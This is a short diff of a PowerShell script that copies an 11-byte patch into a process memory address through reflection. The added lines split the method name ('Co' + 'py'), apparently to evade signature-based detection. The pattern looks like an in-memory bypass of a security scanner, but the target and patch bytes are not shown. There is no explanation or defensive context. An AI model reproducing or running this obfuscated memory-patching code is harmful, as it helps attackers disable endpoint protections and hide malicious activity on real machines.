@@ -31,3 +31,6 @@ $method.Invoke($null, ($Patch, 0, $Address, 11))
 
 # Casting address and calling
 $new::Copy([byte[]]$Patch, [int]0, [IntPtr]$Address, [int]11)
+
+$ptr = New-Object IntPtr($Address)
+$new.GetMethod("Co" + "py", [type[]]([byte[]], [int], [IntPtr], [int])).Invoke($null, @([byte[]]$Patch, [int]0, $ptr, [int]11))
